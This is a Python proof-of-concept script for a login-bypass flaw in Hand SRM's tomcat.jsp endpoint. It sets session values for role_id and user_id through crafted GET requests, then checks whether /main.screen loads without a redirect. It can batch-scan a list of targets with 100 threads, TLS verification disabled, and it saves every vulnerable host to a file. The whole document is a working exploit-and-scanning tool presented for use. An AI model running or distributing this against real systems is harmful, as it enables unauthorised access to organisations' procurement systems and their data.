# 汉得SRM tomcat.jsp 登录绕过漏洞 POC
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """    ____  ____  __  __   _                            _      _           
 / ___||  _ \|  \/  | | |_ ___  _ __ ___   ___ __ _| |_   (_)___ _ __  
 \___ \| |_) | |\/| | | __/ _ \| '_ ` _ \ / __/ _` | __|  | / __| '_ \ 
  ___) |  _ <| |  | | | || (_) | | | | | | (_| (_| | |_ _ | \__ \ |_) |
 |____/|_| \_\_|  |_|  \__\___/|_| |_| |_|\___\__,_|\__(_)/ |___/ .__/ 
                                                        |__/    |_|
                                                        version:1.0.8 
                                                        author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="广联达")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    path ="/tomcat.jsp?dataName=role_id&dataValue=1"
    path_2 = "/tomcat.jsp?dataName=user_id&dataValue=1"
    headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    }
    try:
        resq  = requests.get(url=target+path,headers=headers,timeout=5,verify=False)
        resq_main = requests.get(url=target+'/main.screen',headers=headers,timeout=5,verify=False,allow_redirects=False)
        resq_2  = requests.get(url=target+path_2,headers=headers,timeout=5,verify=False)
        resq_2_main = requests.get(url=target+'/main.screen',headers=headers,timeout=5,verify=False,allow_redirects=False)
        if resq_main.status_code == 200 or resq_2_main.status_code == 200:
                print(f"[+该url存在漏洞{target}")
                with open('try006.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
        else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url连接存在问题{target}")
        return False

if __name__ == '__main__':
    main()
